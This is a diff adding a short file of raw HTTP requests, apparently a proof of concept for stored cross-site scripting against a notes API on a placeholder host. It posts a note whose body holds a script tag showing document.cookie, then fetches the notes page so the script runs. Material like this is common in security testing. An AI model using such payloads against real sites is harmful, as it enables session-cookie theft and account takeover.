@@ -1,0 +1,12 @@
+POST /api/notes HTTP/1.1
+Host: TARGET:5000
+Content-Type: application/json
+Connection: close
+
+{"title":"test","body":"<script>alert(document.cookie)</script>","author":"anonymous"}
+
+---
+
+GET /notes HTTP/1.1
+Host: TARGET:5000
+Connection: close
